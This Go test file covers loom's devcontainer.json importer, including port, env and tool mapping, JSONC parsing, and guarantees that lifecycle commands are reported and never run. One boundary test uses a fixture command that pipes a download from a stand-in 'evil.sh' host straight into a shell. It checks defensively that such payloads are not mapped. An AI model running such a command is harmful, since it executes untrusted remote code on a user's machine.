package engine

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"reflect"
	"slices"
	"strings"
	"testing"

	"github.com/iVersatile/loom/internal/playbook"
)

// writeFixture writes a devcontainer.json into a fresh temp dir and returns its
// path. Tests never write into the repo tree.
func writeFixture(t *testing.T, body string) string {
	t.Helper()
	dir := t.TempDir()
	path := filepath.Join(dir, "devcontainer.json")
	if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
		t.Fatalf("write fixture: %v", err)
	}
	return path
}

// TestImportMapsPortsAndEnv pins FR-IMPORT-001's mapping half: forwardPorts +
// appPort -> ports (int and string forms), containerEnv ∪ remoteEnv -> env names
// (deduped, sorted), and the draft re-parses + validates as a project playbook.
func TestImportMapsPortsAndEnv(t *testing.T) {
	src := writeFixture(t, `{
  "name": "demo",
  "image": "mcr.microsoft.com/devcontainers/go:1.22",
  "forwardPorts": [3000, "8080"],
  "containerEnv": {"NODE_ENV": "production"},
  "remoteEnv": {"API_HOST": "x"}
}`)

	res, err := Import(src)
	if err != nil {
		t.Fatalf("Import: %v", err)
	}

	if !reflect.DeepEqual(res.Mapped.Ports, []int{3000, 8080}) {
		t.Errorf("Mapped.Ports = %v, want [3000 8080]", res.Mapped.Ports)
	}
	if !reflect.DeepEqual(res.Mapped.Env, []string{"API_HOST", "NODE_ENV"}) {
		t.Errorf("Mapped.Env = %v, want [API_HOST NODE_ENV]", res.Mapped.Env)
	}

	if _, err := os.Stat(res.Draft); err != nil {
		t.Fatalf("draft not written: %v", err)
	}
	pb, err := playbook.ParseFile(res.Draft)
	if err != nil {
		t.Fatalf("ParseFile: %v", err)
	}
	if err := pb.Validate(); err != nil {
		t.Fatalf("Validate: %v", err)
	}
	if pb.Name == "" {
		t.Errorf("draft Name is empty, want a project name")
	}
	if pb.Name != "demo" {
		t.Errorf("Name = %q, want demo (devcontainer.name)", pb.Name)
	}
	if !reflect.DeepEqual(pb.Ports, []int{3000, 8080}) {
		t.Errorf("draft Ports = %v, want [3000 8080]", pb.Ports)
	}
	if !reflect.DeepEqual(pb.Env, []string{"API_HOST", "NODE_ENV"}) {
		t.Errorf("draft Env = %v, want [API_HOST NODE_ENV]", pb.Env)
	}
}

// TestImportReportsImageAndCommands pins FR-IMPORT-001's report half (now that BOTH
// features and commands are REPORTED, never deferred): the image is REPORTED (never
// written into the playbook); a CUSTOM/unmapped feature is REPORTED (unmapped_features);
// the lifecycle command is REPORTED (its hook surfaced in --json reported.commands);
// and NOTHING remains in the deferred set — every non-mapped field is reported, never
// silently dropped.
func TestImportReportsImageAndCommands(t *testing.T) {
	const image = "mcr.microsoft.com/devcontainers/go:1.22"
	const customRef = "ghcr.io/acme/custom:1"
	src := writeFixture(t, `{
  "name": "demo",
  "image": "`+image+`",
  "features": {"`+customRef+`": {}},
  "postCreateCommand": "make"
}`)

	res, err := Import(src)
	if err != nil {
		t.Fatalf("Import: %v", err)
	}

	if res.Reported["image"] != image {
		t.Errorf("Reported[image] = %q, want %q", res.Reported["image"], image)
	}
	if slices.Contains(res.Deferred, "features") {
		t.Errorf("Deferred = %v, want it to NOT contain features (features now map/report)", res.Deferred)
	}
	// commands are now REPORTED, not deferred: the deferred set is empty.
	if slices.Contains(res.Deferred, "commands") {
		t.Errorf("Deferred = %v, want it to NOT contain commands (commands are now REPORTED)", res.Deferred)
	}
	if len(res.Deferred) != 0 {
		t.Errorf("Deferred = %v, want empty (nothing remains deferred in Stage-1 import)", res.Deferred)
	}
	if !strings.Contains(res.Reported["commands"], "postCreateCommand") {
		t.Errorf("Reported[commands] = %q, want it to surface the postCreateCommand hook", res.Reported["commands"])
	}
	if !strings.Contains(res.Reported["unmapped_features"], customRef) {
		t.Errorf("Reported[unmapped_features] = %q, want it to contain %q", res.Reported["unmapped_features"], customRef)
	}

	// The image must NEVER be written into the playbook (base_image is an
	// engine-level floor; loom enriches, never degrades-to — ADR-0012/0003).
	data, err := os.ReadFile(res.Draft)
	if err != nil {
		t.Fatalf("ReadFile draft: %v", err)
	}
	if strings.Contains(string(data), image) {
		t.Errorf("draft leaked the image %q:\n%s", image, data)
	}
}

// TestImportMapsKnownFeaturesToTools pins FR-IMPORT-004's mapping half: recognized
// official features map to loom tools — name@<version-option> when the feature's
// `version` OPTION is a clean token, else the bare tool name — deduped + sorted, and
// `features` leaves the deferred set.
func TestImportMapsKnownFeaturesToTools(t *testing.T) {
	src := writeFixture(t, `{
  "name": "demo",
  "features": {
    "ghcr.io/devcontainers/features/go:1": {"version": "1.22"},
    "ghcr.io/devcontainers/features/node:1": {}
  }
}`)

	res, err := Import(src)
	if err != nil {
		t.Fatalf("Import: %v", err)
	}

	want := []string{"go@1.22", "node"}
	if !reflect.DeepEqual(res.Mapped.Tools, want) {
		t.Errorf("Mapped.Tools = %v, want %v", res.Mapped.Tools, want)
	}
	if slices.Contains(res.Deferred, "features") {
		t.Errorf("Deferred = %v, want it to NOT contain features", res.Deferred)
	}

	pb, err := playbook.ParseFile(res.Draft)
	if err != nil {
		t.Fatalf("ParseFile: %v", err)
	}
	if !reflect.DeepEqual(pb.Tools, want) {
		t.Errorf("draft Tools = %v, want %v", pb.Tools, want)
	}
}

// TestImportReportsUnknownFeatures pins FR-IMPORT-004's report half: a recognized
// feature still maps to a tool while an UNRECOGNIZED/custom ref is surfaced in
// reported (unmapped_features), never guessed; `features` stays out of deferred.
func TestImportReportsUnknownFeatures(t *testing.T) {
	const customRef = "ghcr.io/acme/custom-thing:2"
	src := writeFixture(t, `{
  "name": "demo",
  "features": {
    "ghcr.io/devcontainers/features/go:1": {},
    "`+customRef+`": {}
  }
}`)

	res, err := Import(src)
	if err != nil {
		t.Fatalf("Import: %v", err)
	}

	if !reflect.DeepEqual(res.Mapped.Tools, []string{"go"}) {
		t.Errorf("Mapped.Tools = %v, want [go]", res.Mapped.Tools)
	}
	if !strings.Contains(res.Reported["unmapped_features"], customRef) {
		t.Errorf("Reported[unmapped_features] = %q, want it to contain %q", res.Reported["unmapped_features"], customRef)
	}
	if slices.Contains(res.Deferred, "features") {
		t.Errorf("Deferred = %v, want it to NOT contain features", res.Deferred)
	}
}

// TestImportFeatureNameBoundary pins the host-anchored boundary match (not substring):
// a CUSTOM ref that merely CONTAINS "devcontainers/features/" but isn't the official
// <host>/devcontainers/features/<name> shape must be REPORTED, never wrongly mapped to
// the official tool (the false-positive direction is the unsafe one).
func TestImportFeatureNameBoundary(t *testing.T) {
	const fake1 = "ghcr.io/me/devcontainers/features/go:1" // 5 segments — extra path
	const fake2 = "x-devcontainers/features/go:1"          // 3 segments — substring, not a host boundary
	src := writeFixture(t, `{
  "name": "demo",
  "features": { "`+fake1+`": {}, "`+fake2+`": {} }
}`)

	res, err := Import(src)
	if err != nil {
		t.Fatalf("Import: %v", err)
	}
	if len(res.Mapped.Tools) != 0 {
		t.Errorf("Mapped.Tools = %v, want empty (custom refs must NOT masquerade as official go)", res.Mapped.Tools)
	}
	um := res.Reported["unmapped_features"]
	if !strings.Contains(um, fake1) || !strings.Contains(um, fake2) {
		t.Errorf("both custom refs must be reported as unmapped, got %q", um)
	}
}

// TestImportMultiToolFeatureBareNames pins F3: a multi-tool feature
// (kubectl-helm-minikube -> kubectl, helm) emits BARE names — the single `version`
// option pins only the primary tool, so applying it to siblings would be a wrong pin.
func TestImportMultiToolFeatureBareNames(t *testing.T) {
	src := writeFixture(t, `{
  "name": "demo",
  "features": { "ghcr.io/devcontainers/features/kubectl-helm-minikube:1": {"version": "1.30"} }
}`)

	res, err := Import(src)
	if err != nil {
		t.Fatalf("Import: %v", err)
	}
	want := []string{"helm", "kubectl"}
	if !reflect.DeepEqual(res.Mapped.Tools, want) {
		t.Errorf("Mapped.Tools = %v, want %v (bare names; the version is tool-ambiguous)", res.Mapped.Tools, want)
	}
}

// TestImportDraftValidatesNoClobber pins FR-IMPORT-002's no-clobber output: the
// draft basename is loom.imported.yml (never loom.yml), and a pre-existing
// authored loom.yml in the same dir is left untouched.
func TestImportDraftValidatesNoClobber(t *testing.T) {
	dir := t.TempDir()
	src := filepath.Join(dir, "devcontainer.json")
	if err := os.WriteFile(src, []byte(`{"name":"demo","forwardPorts":[3000]}`), 0o644); err != nil {
		t.Fatalf("write fixture: %v", err)
	}

	const sentinel = "# AUTHORED - DO NOT TOUCH\nloom: 1\n"
	canonical := filepath.Join(dir, "loom.yml")
	if err := os.WriteFile(canonical, []byte(sentinel), 0o644); err != nil {
		t.Fatalf("write sentinel loom.yml: %v", err)
	}

	res, err := Import(src)
	if err != nil {
		t.Fatalf("Import: %v", err)
	}
	if filepath.Base(res.Draft) != importedPlaybookName {
		t.Errorf("draft basename = %q, want %q", filepath.Base(res.Draft), importedPlaybookName)
	}
	if filepath.Base(res.Draft) == "loom.yml" {
		t.Errorf("draft must never be loom.yml, got %q", res.Draft)
	}

	got, err := os.ReadFile(canonical)
	if err != nil {
		t.Fatalf("ReadFile loom.yml: %v", err)
	}
	if string(got) != sentinel {
		t.Errorf("authored loom.yml was modified:\n%s", got)
	}
}

// TestImportStripsJSONCCommentsRespectingStrings pins FR-IMPORT-003: import
// tolerates // line comments, /* block */ comments, and trailing commas, WITHOUT
// mis-stripping comment-like sequences inside string values.
func TestImportStripsJSONCCommentsRespectingStrings(t *testing.T) {
	src := writeFixture(t, `{
  // a line comment
  "name": "app // not-a-comment",
  /* a block comment */
  "image": "https://example.com/img", // trailing comment
  "containerEnv": {
    "HOMEPAGE": "https://example.com",
    "CSV": "a,b",
  },
  "forwardPorts": [3000, 8080,],
}`)

	res, err := Import(src)
	if err != nil {
		t.Fatalf("Import (JSONC should be tolerated): %v", err)
	}
	pb, err := playbook.ParseFile(res.Draft)
	if err != nil {
		t.Fatalf("ParseFile: %v", err)
	}
	// The //-inside-a-string must have survived the stripper (the footgun): the
	// image is REPORTED verbatim, so its `//` proves it directly.
	if res.Reported["image"] != "https://example.com/img" {
		t.Errorf("reported image = %q, want %q (//-inside-string survived verbatim)", res.Reported["image"], "https://example.com/img")
	}
	// Secondary probe: the `//` inside the name value also survived — "app //
	// not-a-comment" slugifies to "app-not-a-comment"; had the stripper eaten the
	// "//" as a comment, the value would be "app " → slug "app".
	if pb.Name != "app-not-a-comment" {
		t.Errorf("Name = %q, want %q (//-inside-name survived the stripper, then slugified)", pb.Name, "app-not-a-comment")
	}
	if !reflect.DeepEqual(pb.Env, []string{"CSV", "HOMEPAGE"}) {
		t.Errorf("Env = %v, want [CSV HOMEPAGE]", pb.Env)
	}
	if !reflect.DeepEqual(pb.Ports, []int{3000, 8080}) {
		t.Errorf("Ports = %v, want [3000 8080] (trailing comma tolerated)", pb.Ports)
	}
}

// TestStripJSONC directly asserts the helper preserves comment-like/comma-like
// sequences inside strings, removes comments outside strings, and drops trailing
// commas.
func TestStripJSONC(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want string
	}{
		{"line comment outside", "{\n// gone\n\"a\":1\n}", "{\n\n\"a\":1\n}"},
		{"block comment outside", "{/* gone */\"a\":1}", "{\"a\":1}"},
		{"slashes inside string", `{"u":"http://x//y"}`, `{"u":"http://x//y"}`},
		{"block marker inside string", `{"u":"a/*b*/c"}`, `{"u":"a/*b*/c"}`},
		{"comma inside string", `{"u":"a,b"}`, `{"u":"a,b"}`},
		{"trailing comma object", `{"a":1,}`, `{"a":1}`},
		{"trailing comma array", `[1,2,]`, `[1,2]`},
		{"trailing comma before comment", "[1,2, /*x*/ ]", "[1,2  ]"},
		{"escaped quote in string", `{"u":"a\"//b"}`, `{"u":"a\"//b"}`},
		{"non-trailing comma kept", `{"a":1,"b":2}`, `{"a":1,"b":2}`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := string(stripJSONC([]byte(c.in))); got != c.want {
				t.Errorf("stripJSONC(%q) = %q, want %q", c.in, got, c.want)
			}
		})
	}
}

// TestImportSanitizesName proves a devcontainer name with docker-unsafe chars
// (spaces, '/', ':') is slugified into a valid playbook/container name — an
// unsanitized name would flow into the playbook `name:` and break the build.
func TestImportSanitizesName(t *testing.T) {
	src := writeFixture(t, `{"name":"My Org/Repo: v2","image":"x"}`)
	res, err := Import(src)
	if err != nil {
		t.Fatalf("import: %v", err)
	}
	pb, err := playbook.ParseFile(res.Draft)
	if err != nil {
		t.Fatalf("parse draft: %v", err)
	}
	if pb.Name != "my-org-repo-v2" {
		t.Errorf("Name = %q, want %q (slugified)", pb.Name, "my-org-repo-v2")
	}
	if err := pb.Validate(); err != nil {
		t.Errorf("sanitized draft must validate: %v", err)
	}
}

// executableFields are the playbook fields the engine actually PROVISIONS or runs
// from. FR-IMPORT-005's security guarantee is that a captured command lands in NONE
// of them — it is review DATA in reported.commands, never an execution path. Asserted
// by re-marshaling only these fields and confirming the command string is absent.
type executableFields struct {
	Tools    []string `json:"tools"`
	Agents   []string `json:"agents"`
	Hooks    []string `json:"hooks"`
	Rules    []string `json:"rules"`
	Dotfiles []string `json:"dotfiles"`
}

// TestImportCapturesLifecycleCommandsAsReported pins FR-IMPORT-005's core: a
// devcontainer with a postCreateCommand (string form) captures it verbatim into the
// draft's reported.commands tagged with its lifecycle hook — and the command appears
// in NO executable/mapped field (tools/agents/hooks/rules/dotfiles), proving loom
// never wires it for execution (ADR-0005 worst-thing test). loom never auto-runs it.
func TestImportCapturesLifecycleCommandsAsReported(t *testing.T) {
	const cmd = "make build && ./dangerous.sh"
	src := writeFixture(t, `{
  "name": "demo",
  "postCreateCommand": "`+cmd+`"
}`)

	res, err := Import(src)
	if err != nil {
		t.Fatalf("Import: %v", err)
	}

	pb, err := playbook.ParseFile(res.Draft)
	if err != nil {
		t.Fatalf("ParseFile: %v", err)
	}
	if pb.Reported == nil || len(pb.Reported.Commands) != 1 {
		t.Fatalf("draft reported.commands = %+v, want exactly one captured command", pb.Reported)
	}
	got := pb.Reported.Commands[0]
	if got.Hook != "postCreateCommand" {
		t.Errorf("captured hook = %q, want postCreateCommand", got.Hook)
	}
	if !reflect.DeepEqual(got.Run, []string{cmd}) {
		t.Errorf("captured Run = %v, want [%q] (verbatim)", got.Run, cmd)
	}

	// The command must NOT appear in any field the engine provisions/runs from.
	exec, err := json.Marshal(executableFields{
		Tools: pb.Tools, Agents: pb.Agents, Hooks: pb.Hooks, Rules: pb.Rules, Dotfiles: pb.Dotfiles,
	})
	if err != nil {
		t.Fatalf("marshal executable fields: %v", err)
	}
	if strings.Contains(string(exec), "make") || strings.Contains(string(exec), "dangerous") {
		t.Errorf("imported command leaked into an executable field: %s", exec)
	}
	// And it must NOT be deferred — it has a (non-executable) home.
	if slices.Contains(res.Deferred, "commands") {
		t.Errorf("Deferred = %v, want commands REPORTED not deferred", res.Deferred)
	}
}

// TestImportCapturesCommandFormsArrayObject pins FR-IMPORT-005's polymorphic handling:
// the devcontainer array form (argv) and object form (parallel named commands) are
// both captured into reported.commands (normalized to readable command strings), in
// lifecycle order, none mapped to an executable field.
func TestImportCapturesCommandFormsArrayObject(t *testing.T) {
	src := writeFixture(t, `{
  "name": "demo",
  "onCreateCommand": ["npm", "ci"],
  "postStartCommand": { "server": "node server.js", "watch": ["npm", "run", "watch"] }
}`)

	res, err := Import(src)
	if err != nil {
		t.Fatalf("Import: %v", err)
	}
	pb, err := playbook.ParseFile(res.Draft)
	if err != nil {
		t.Fatalf("ParseFile: %v", err)
	}
	if pb.Reported == nil {
		t.Fatalf("draft reported is nil, want captured commands")
	}
	// Lifecycle order: onCreateCommand before postStartCommand.
	want := []playbook.ReportedCommand{
		{Hook: "onCreateCommand", Run: []string{"npm ci"}},
		{Hook: "postStartCommand", Run: []string{"node server.js", "npm run watch"}}, // object keys sorted: server, watch
	}
	if !reflect.DeepEqual(pb.Reported.Commands, want) {
		t.Errorf("reported.commands = %+v, want %+v", pb.Reported.Commands, want)
	}
	if len(res.Deferred) != 0 {
		t.Errorf("Deferred = %v, want empty", res.Deferred)
	}
}

// TestImportReportedCommandsRoundTripStrictDecode pins FR-IMPORT-005's strict-decode
// safety (#256): an imported draft carrying reported.commands re-parses CLEANLY under
// the strict (DisallowUnknownFields) decoder — i.e. reported.commands is a declared
// schema field, not a key strict decode would reject — and validates as a project-tier
// playbook. This is the round-trip guarantee: import-then-parse never breaks.
func TestImportReportedCommandsRoundTripStrictDecode(t *testing.T) {
	src := writeFixture(t, `{
  "name": "demo",
  "initializeCommand": "echo init",
  "postCreateCommand": "make"
}`)
	res, err := Import(src)
	if err != nil {
		t.Fatalf("Import: %v", err)
	}
	// ParseFile uses the STRICT decoder (UnmarshalStrict). If reported.commands were
	// not a declared field, this would fail with "unknown field" — the whole point.
	pb, err := playbook.ParseFile(res.Draft)
	if err != nil {
		t.Fatalf("strict re-parse of imported draft failed (reported.commands must be a declared field): %v", err)
	}
	if err := pb.Validate(); err != nil {
		t.Fatalf("re-parsed draft must validate: %v", err)
	}
	if pb.Reported == nil || len(pb.Reported.Commands) != 2 {
		t.Fatalf("round-tripped reported.commands = %+v, want 2 captured commands", pb.Reported)
	}
}

// TestImportNeverExecutesLifecycleCommands is FR-IMPORT-005's BEHAVIORAL boundary
// proof (ADR-0005 worst-thing test, #257 lock-in). TestImportCapturesLifecycleCommandsAsReported
// asserts a captured command is absent from the executable FIELDS; this asserts the
// STRONGER claim — that import never hands a command to a shell at ALL. Every one of
// the six devcontainer lifecycle hooks carries a command that WOULD create an
// observable sentinel file in a writable temp dir IF a shell ever ran it (across the
// string / array(argv) / object(parallel) forms). After Import, not one sentinel
// exists: loom captured all six into reported.commands and EXECUTED none of them. The
// sentinel dir is real and writable, so the test would catch a regression that shelled
// out — it is not vacuously passing on an unreachable path.
func TestImportNeverExecutesLifecycleCommands(t *testing.T) {
	dir := t.TempDir()
	sentinel := func(n string) string { return filepath.Join(dir, "ran-"+n) }

	// Each hook's command would `touch` its own sentinel IF executed. Forms are
	// mixed deliberately to cover every normalization path: string, array(argv),
	// and object(parallel named commands).
	body := fmt.Sprintf(`{
  "name": "demo",
  "initializeCommand": "touch %s",
  "onCreateCommand": ["touch", "%s"],
  "updateContentCommand": "touch %s && echo go",
  "postCreateCommand": "touch %s",
  "postStartCommand": { "a": "touch %s", "b": ["touch", "%s"] },
  "postAttachCommand": "touch %s"
}`,
		sentinel("initialize"), sentinel("oncreate"), sentinel("updatecontent"),
		sentinel("postcreate"), sentinel("poststart-a"), sentinel("poststart-b"),
		sentinel("postattach"))

	res, err := Import(writeFixture(t, body))
	if err != nil {
		t.Fatalf("Import: %v", err)
	}

	// BEHAVIORAL boundary: not a single imported command was executed.
	if ran, _ := filepath.Glob(filepath.Join(dir, "ran-*")); len(ran) != 0 {
		t.Fatalf("import EXECUTED an imported command — sentinel(s) created: %v (the worst-thing boundary is broken)", ran)
	}

	// And every hook was CAPTURED into reported.commands, in devcontainer lifecycle order.
	pb, err := playbook.ParseFile(res.Draft)
	if err != nil {
		t.Fatalf("ParseFile: %v", err)
	}
	if pb.Reported == nil {
		t.Fatal("draft reported is nil, want all six lifecycle hooks captured")
	}
	gotHooks := make([]string, 0, len(pb.Reported.Commands))
	for _, c := range pb.Reported.Commands {
		gotHooks = append(gotHooks, c.Hook)
	}
	wantHooks := []string{
		"initializeCommand", "onCreateCommand", "updateContentCommand",
		"postCreateCommand", "postStartCommand", "postAttachCommand",
	}
	if !reflect.DeepEqual(gotHooks, wantHooks) {
		t.Errorf("captured hooks = %v, want all six in lifecycle order %v", gotHooks, wantHooks)
	}
	// Commands have a (non-executable) home — never silently deferred/dropped.
	if slices.Contains(res.Deferred, "commands") {
		t.Errorf("Deferred = %v, want commands REPORTED not deferred", res.Deferred)
	}
}

// importDraft is a small helper: Import the given devcontainer.json body and return
// the parsed draft playbook + the ImportResult.
func importDraft(t *testing.T, body string) (*playbook.Playbook, ImportResult) {
	t.Helper()
	res, err := Import(writeFixture(t, body))
	if err != nil {
		t.Fatalf("Import: %v", err)
	}
	pb, err := playbook.ParseFile(res.Draft)
	if err != nil {
		t.Fatalf("ParseFile: %v", err)
	}
	return pb, res
}

// TestImportMapsRecognizedInstallCommandsToTools pins the #259 commands→tools
// declarative mapping (FR-IMPORT-006): a lifecycle command that is, in its entirety,
// a clean install of recognized packages is lifted to tools: (deduped + sorted, union
// with feature-derived tools) and CONSUMED from reported.commands — mirroring
// features→tools (FR-IMPORT-004). Everything else stays in reported.commands.
func TestImportMapsRecognizedInstallCommandsToTools(t *testing.T) {
	pb, res := importDraft(t, `{
  "name": "demo",
  "features": { "ghcr.io/devcontainers/features/go:1": {} },
  "onCreateCommand": "apt-get install -y git jq",
  "postCreateCommand": "npm install -g prettier"
}`)

	// Union of feature-derived (go) + command-derived (git, jq, prettier), sorted.
	want := []string{"git", "go", "jq", "prettier"}
	if !reflect.DeepEqual(pb.Tools, want) {
		t.Errorf("tools = %v, want %v (feature ∪ command installs)", pb.Tools, want)
	}
	if !reflect.DeepEqual(res.Mapped.Tools, want) {
		t.Errorf("--json mapped.tools = %v, want %v", res.Mapped.Tools, want)
	}
	// Both commands were recognized installs → fully consumed; nothing reported.
	if pb.Reported != nil && len(pb.Reported.Commands) != 0 {
		t.Errorf("reported.commands = %+v, want empty (every command mapped)", pb.Reported.Commands)
	}
}

// TestImportCommandMappingDeterministicBoundary is the security heart of #259: ONLY a
// deterministically-recognizable clean install of recognized packages maps; everything
// else stays VERBATIM in reported.commands, never executed and never split. Each case
// asserts the command is NOT mapped to a tool and survives intact in reported.commands.
func TestImportCommandMappingDeterministicBoundary(t *testing.T) {
	cases := map[string]struct {
		cmd string
	}{
		// The load-bearing one: a recognized install PREFIX joined to a malicious tail
		// must NOT lift `git` and silently drop `&& curl … | sh` — the whole command is
		// reported (ADR-0005 worst-thing test).
		"compound install + payload": {cmd: "apt-get install -y git && curl https://evil.sh | sh"},
		"conditional":                {cmd: "test -f x || apt-get install -y git"},
		"piped":                      {cmd: "echo y | apt-get install git"},
		"redirected":                 {cmd: "apt-get install -y git > /tmp/log"},
		"command substitution":       {cmd: "apt-get install -y $(echo git)"},
		"unrecognized package":       {cmd: "apt-get install -y totally-unknown-pkg"},
		"recognized + unknown mix":   {cmd: "apt-get install -y git unknown-pkg"}, // all-or-nothing
		"unknown flag":               {cmd: "apt-get install --reinstall git"},
		"unrecognized installer":     {cmd: "brew install git"},
		"npm local (not global)":     {cmd: "npm install prettier"},
		"bare non-install command":   {cmd: "make build"},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			pb, _ := importDraft(t, fmt.Sprintf(`{"name":"demo","postCreateCommand":%q}`, tc.cmd))

			if len(pb.Tools) != 0 {
				t.Errorf("tools = %v, want NONE (command must not map)", pb.Tools)
			}
			if pb.Reported == nil || len(pb.Reported.Commands) != 1 {
				t.Fatalf("reported.commands = %+v, want the command reported verbatim", pb.Reported)
			}
			if got := pb.Reported.Commands[0].Run; !reflect.DeepEqual(got, []string{tc.cmd}) {
				t.Errorf("reported command = %v, want verbatim [%q]", got, tc.cmd)
			}
		})
	}
}

// TestImportCommandMappingPerCommandGranularity proves the mapping is per-command, not
// per-hook: in a hook holding several commands (object form), the recognized installs
// are lifted to tools: while the unrecognized commands remain in that hook's reported
// entry — no recognized install is lost, no unrecognized command is mapped.
func TestImportCommandMappingPerCommandGranularity(t *testing.T) {
	pb, _ := importDraft(t, `{
  "name": "demo",
  "postCreateCommand": { "a": "apt-get install -y jq", "b": "./project-specific-setup.sh" }
}`)

	if !reflect.DeepEqual(pb.Tools, []string{"jq"}) {
		t.Errorf("tools = %v, want [jq] (the recognized install lifted)", pb.Tools)
	}
	if pb.Reported == nil || len(pb.Reported.Commands) != 1 {
		t.Fatalf("reported.commands = %+v, want the unrecognized command kept", pb.Reported)
	}
	got := pb.Reported.Commands[0]
	if got.Hook != "postCreateCommand" || !reflect.DeepEqual(got.Run, []string{"./project-specific-setup.sh"}) {
		t.Errorf("reported entry = %+v, want only the unrecognized setup script under postCreateCommand", got)
	}
}

// importNoPanic runs Import on a fixture body and converts any panic into a test
// failure — the load-bearing N3 invariant: a malformed devcontainer.json must NEVER
// panic the importer. Returns the (result, error); the caller asserts the chosen
// graceful outcome (fail-loud error XOR a usable draft).
func importNoPanic(t *testing.T, body string) (res ImportResult, err error) {
	t.Helper()
	src := writeFixture(t, body)
	defer func() {
		if r := recover(); r != nil {
			t.Fatalf("Import PANICKED on malformed input (must fail-loud or skip, never panic): %v", r)
		}
	}()
	return Import(src)
}

// TestImportMalformedInputNeverPanics locks the #234 JSONC-tolerant parser's
// robustness (N3): every malformed / edge-case / garbage-typed devcontainer.json
// parses GRACEFULLY — it either fails loud with a clean error OR produces a usable
// draft (unrecognized bits skipped/reported), but NEVER panics and never silently
// half-writes. The unifying invariant is the no-panic guarantee; per case we also pin
// whether the right graceful outcome is a fail-loud error or a valid draft.
//
//	want: "err"   — must return a non-nil error (fail-loud), no draft expectation
//	want: "draft" — must succeed and the draft must re-parse + validate (graceful skip)
//	want: "any"   — either is acceptable; only the no-panic + (err XOR valid-draft) holds
func TestImportMalformedInputNeverPanics(t *testing.T) {
	cases := map[string]struct {
		body string
		want string
	}{
		// --- JSONC parser edge cases (the stripJSONC state machine) ---
		"empty input":                    {``, "err"},
		"whitespace only":                {"   \n\t  ", "err"},
		"unterminated string":            {`{"name": "abc`, "err"},
		"unterminated block comment":     {`{ /* never closes`, "err"},
		"line comment at EOF no newline": {`{"name":"x"} //trailing`, "draft"},
		"block comment only":             {`/* */`, "err"},
		"lone slash":                     {`/`, "err"},
		"trailing backslash in string":   {`{"name":"x\`, "err"},
		"trailing comma object":          {`{"name":"x",}`, "draft"},
		"trailing comma array":           {`{"forwardPorts":[8080,]}`, "draft"},
		"comment markers inside string":  {`{"image":"https://x.io//a/*b*/c"}`, "draft"},
		"not json at all":                {`just some text`, "err"},
		"json array not object":          {`["a","b"]`, "err"},
		"bare scalar":                    {`42`, "err"},
		"empty object":                   {`{}`, "draft"},

		// --- garbage-typed fields (wrong JSON type for the schema) ---
		"forwardPorts as string":   {`{"forwardPorts":"8080"}`, "err"},  // []RawMessage vs string
		"features as array":        {`{"features":["x"]}`, "err"},       // map vs array
		"containerEnv numeric val": {`{"containerEnv":{"X":5}}`, "err"}, // map[string]string vs number
		"name as number":           {`{"name":123}`, "err"},

		// --- garbage that the RawMessage helpers must SKIP gracefully (valid draft) ---
		"appPort garbage object":      {`{"appPort":{"weird":true}}`, "draft"},
		"forwardPorts mixed garbage":  {`{"forwardPorts":[8080,"nope",{"x":1},null]}`, "draft"},
		"feature value not an object": {`{"features":{"ghcr.io/devcontainers/features/go:1":"notobj"}}`, "draft"},
		"feature value null":          {`{"features":{"ghcr.io/devcontainers/features/go:1":null}}`, "draft"},
		"command as a number":         {`{"postCreateCommand":42}`, "draft"},
		"command as null":             {`{"postCreateCommand":null}`, "draft"},
		"command empty object":        {`{"postStartCommand":{}}`, "draft"},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			res, err := importNoPanic(t, tc.body)

			switch tc.want {
			case "err":
				if err == nil {
					t.Errorf("want a fail-loud error, got nil (draft=%q)", res.Draft)
				}
			case "draft":
				if err != nil {
					t.Fatalf("want a graceful draft, got error: %v", err)
				}
			}

			// Universal post-condition: a successful import must yield a draft that
			// re-parses AND validates — never a half-baked/corrupt file.
			if err == nil {
				pb, perr := playbook.ParseFile(res.Draft)
				if perr != nil {
					t.Fatalf("import succeeded but draft does not re-parse: %v", perr)
				}
				if verr := pb.Validate(); verr != nil {
					t.Fatalf("import succeeded but draft does not validate: %v", verr)
				}
			}
		})
	}
}
